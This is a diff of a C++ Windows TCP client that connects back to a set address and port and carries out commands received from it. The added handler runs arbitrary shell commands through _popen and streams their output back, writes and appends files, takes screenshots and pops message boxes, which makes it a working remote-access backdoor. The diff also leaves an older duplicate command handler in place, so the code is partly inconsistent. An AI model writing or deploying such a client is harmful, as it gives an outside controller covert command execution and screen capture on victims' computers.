@@ -31,45 +31,34 @@ bool    Connected = false;
 void TCPClientStart();
 void Connect();
 void SendMsg(std::string msg);
+void Send(std::string msg);
 void CloseSocket();
 void UDF_WSACleanup();
 
+void exec(std::string command);
 
 std::string ReceiveMsg();
 std::string CommandsHandler(std::string);
-std::string split(std::string, int, int);
 
 int main() {
 	while (true) {
-
 		TCPClientStart();
-
 		if (iTCPClientStart == 0) {
-
 			while (true) {
-
 				if (iTCPClientStart == 0) {
-
 					Connect();
-
 					if (iConnect != INVALID_SOCKET) {
 
 						Connected = true;
 
 						while (Connected) {
-
 							std::string message = ReceiveMsg();
 
-							if (iRecv != SOCKET_ERROR) {
-
-								SendMsg(CommandsHandler(message));
-
-							}
+							if (iRecv != SOCKET_ERROR) SendMsg(CommandsHandler(message));
 							else Connected = false;
 						}
 					}
 				}
-
 				CloseSocket();
 				UDF_WSACleanup();
 
@@ -83,8 +72,172 @@ int main() {
 }
 
 
+// CommandsHandler
+std::string CommandsHandler(std::string msg) {
+
+	// "help" command
+	if (msg.find("help") == 0) {
+		std::string help = "Help Commands:\n\t";
+		help.append("help\n\t");
+		help.append("exec [Command]\n\t");
+		help.append("CreateFile [FileName] in [Directory]\n\t");
+		help.append("Screenshot [FileName] in [Directory]\n\t");
+		return help;
+	}
+
+	// "CreateFile" command
+	else if (msg.find("CreateFile") == 0) {
+
+		if (msg.find(" ") == 10) {
+			int splitPoint = msg.find(" in ");
+			if (splitPoint == std::string::npos) return "Invalid Syntax";
+
+			std::string fileName = split(msg, 11, splitPoint);
+			splitPoint += 4;
+			if (splitPoint >= msg.length()) return "Invalid Syntax";
+
+			std::string loc = split(msg, splitPoint, msg.length());
+			std::string path = loc;
+			path.append(fileName);
+
+			std::ofstream file(path);
+			if (file.is_open()) {
+				file.close();
+				return "File created at " + path;
+			}
+			else return "Failed to create file! Please check the path you entered";
+		}
+		else return "Invalid Syntax";
+	}
+
+	else if (msg.find("WriteFile") == 0) {
+
+		if (msg.find(" ") == 9) {
+			int splitPoint = msg.find(" ~> ");
+			if (splitPoint == std::string::npos) return "Invalid Syntax";
+
+			std::string filename = split(msg, 10, splitPoint);
+			splitPoint += 4;
+			if (splitPoint >= msg.length()) return "Invalid Syntax";
+
+			std::string text = split(msg, splitPoint, msg.length());
+
+			std::ofstream outfile;
+			outfile.open(filename);
+
+			outfile << text;
+			if (outfile.is_open()) {
+				outfile.close();
+				return "Done! ";
+			}
+			else return "Failed to write file! Please check the file name you entered";
+		}
+		else return "Invalid Syntax";
+	}
+
+	else if (msg.find("AppendFile") == 0) {
+
+		if (msg.find(" ") == 10) {
+			int splitPoint = msg.find(" ~> ");
+			if (splitPoint == std::string::npos) return "Invalid Syntax";
+
+			std::string filename = split(msg, 11, splitPoint);
+			splitPoint += 4;
+			if (splitPoint >= msg.length()) return "Invalid Syntax";
+
+			std::string text = split(msg, splitPoint, msg.length());
+
+			std::ofstream outfile;
+			outfile.open(filename, std::ofstream::app);
+
+			outfile << text;
+			if (outfile.is_open()) {
+				outfile.close();
+				return "Done! ";
+			}
+			else return "Failed to append file! Please check the file name you entered";
+		}
+		else return "Invalid Syntax";
+	}
+
+	// "Screenshot" command
+	else if (msg.find("Screenshot") == 0) {
+		if (msg.find(" ") == 10) {
+			int splitPoint = msg.find(" in ");
+			if (splitPoint == std::string::npos) return "Invalid Syntax";
+
+			std::string fileName = split(msg, 11, splitPoint);
+			splitPoint += 4;
+			if (splitPoint >= msg.length()) return "Invalid Syntax";
+
+			std::string path = split(msg, splitPoint, msg.length());
+			path.append(fileName);
+			TakeScreenShot(path);
+
+			return "Screenshot saved at \"" + path + "\"";
+		}
+		else return "Invalid Syntax";
+	}
+
+	else if (msg.find("MsgBox") == 0) {
+
+		if (msg.find(" ") == 6) {
+			int splitPoint = msg.find(" ~> ");
+			if (splitPoint == std::string::npos) return "Invalid Syntax";
+
+			std::wstring title_temp = s2ws(split(msg, 7, splitPoint));
+			LPCWSTR title = title_temp.c_str();
+
+			splitPoint += 4;
+			if (splitPoint >= msg.length()) return "Invalid Syntax";
+
+			std::wstring text_temp = s2ws(split(msg, splitPoint, msg.length()));
+			LPCWSTR text = text_temp.c_str();
+
+			MessageBox(0, text, title, MB_OK);
+
+			return "Done!";
+		}
+		else return "Invalid Syntax";
+	}
+
+	else if (msg.find("exec") == 0) {
+		if (msg.find(" ") == 4) {
+			std::string cmd = split(msg, 5, msg.length());
+			exec(cmd);
+			return "";
+		}
+	}
+
+
+	else {
+		return "Command not found! Use \"help\" to get list of commands available";
+	}
+
+}
+
+
+// Useful fucntions
+void exec(std::string command) {
+	char buffer[128];
+	std::string result;
+	FILE* pipe = _popen(command.c_str(), "r");
+
+	if (!pipe) {
+		SendMsg("_popen failed!");
+	}
+
+	while (!feof(pipe)) {
+		if (fgets(buffer, 128, pipe) != NULL) {
+			Send(buffer);
+		}
+	}
+	_pclose(pipe);
+}
+
+
+// TCP Socket etc
 void TCPClientStart() {
-	// WSAStartup
 	iWsaStartup = WSAStartup(MAKEWORD(2, 2), &Winsockdata);
 	if (iWsaStartup != 0) {
 		std::cout << "WSAStartUp Failed!" << std::endl;
@@ -92,16 +245,12 @@ void TCPClientStart() {
 	else {
 		std::cout << "WSAStartUp Success!" << std::endl;
 
-		// Filling Structure
 		TCPServerAdd.sin_family = AF_INET;
 		TCPServerAdd.sin_addr.s_addr = inet_addr(ipAddr);
 		TCPServerAdd.sin_port = htons(port);
 
-		// Socket Creation
 		TCPClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-		if (TCPClientSocket == INVALID_SOCKET) {
-			std::cout << "TCP Client Socket Creation Failed!" << WSAGetLastError() << std::endl;
-		}
+		if (TCPClientSocket == INVALID_SOCKET) std::cout << "TCP Client Socket Creation Failed!" << WSAGetLastError() << std::endl;
 		else {
 			std::cout << "TCP Client Socket Creation Success!" << std::endl;
 			iTCPClientStart = 0;
@@ -118,12 +267,10 @@ void Connect() {
 void SendMsg(std::string msg) {
 	char SenderBuffer;
 
-	// Appending "EOT" char to message
 	msg += (char)3;
 	msg += (char)3;
 	msg += (char)3;
 
-	// Sending the message to client
 	for (int i = 0; i < msg.size(); i++) {
 		SenderBuffer = msg.at(i);
 		if (send(TCPClientSocket, &SenderBuffer, sizeof(SenderBuffer), 0) == SOCKET_ERROR) {
@@ -132,7 +279,25 @@ void SendMsg(std::string msg) {
 		}
 	}
 
-	// Checking if message was sent successfully
+	if (ErrorInSendMessage) {
+		std::cout << "An error occurred while sending message to client! Error no: " << WSAGetLastError() << std::endl;
+	}
+	else {
+		std::cout << "Message was sent successfuly!" << std::endl;
+	}
+}
+
+void Send(std::string msg) {
+	char SenderBuffer;
+
+	for (int i = 0; i < msg.size(); i++) {
+		SenderBuffer = msg.at(i);
+		if (send(TCPClientSocket, &SenderBuffer, sizeof(SenderBuffer), 0) == SOCKET_ERROR) {
+			ErrorInSendMessage = true;
+			break;
+		}
+	}
+
 	if (ErrorInSendMessage) {
 		std::cout << "An error occurred while sending message to client! Error no: " << WSAGetLastError() << std::endl;
 	}
@@ -149,7 +314,7 @@ std::string ReceiveMsg() {
 	std::string msg;
 	std::string tmp;
 
-	std::cout << "Receiving Message: ";
+	std::cout << "Waiting for commands... " << std::endl;
 	while (true) {
 		iRecv = recv(TCPClientSocket, &RecvBuffer, iRecvBuffer, 0);
 		if (iRecv == SOCKET_ERROR) {
@@ -203,10 +368,12 @@ std::string CommandsHandler(std::string msg) {
 		return help;
 	}
 	else if (msg.find("create") == 0) {
+		//std::cout << "create [FileName] in [Directory]" << std::endl;
 		if (msg.find(" ") == 6) {
 			int splitPoint = msg.find(" in ");
 			if (splitPoint == std::string::npos) return "Invalid Syntax";
 			std::string fileName = split(msg, 7, splitPoint);
+			//std::cout << "File Name: >" << fileName << "<" << std::endl; // debuging line
 			splitPoint += 4;
 			if (splitPoint >= msg.length()) return "Invalid Syntax";
 			std::string loc = split(msg, splitPoint, msg.length());
@@ -215,11 +382,12 @@ std::string CommandsHandler(std::string msg) {
 			std::ofstream file(path);
 			if (file.is_open()) {
 				file.close();
-				return "File is created.";
+				return "Done";
 			}
 			else {
 				return "File filed to create";
 			}
+			//std::cout << "Location: >" << loc << "<" << std::endl; // debuging line
 		}
 		else {
 			return "Invalid Syntax of create cmd";
@@ -236,7 +404,7 @@ std::string CommandsHandler(std::string msg) {
 			std::string path = loc;
 			path.append(fileName);
 			TakeScreenShot(path);
-			return "Screenshot taken.";
+			return "Done";
 		}
 		else {
 			return "Invalid Syntax of create cmd";
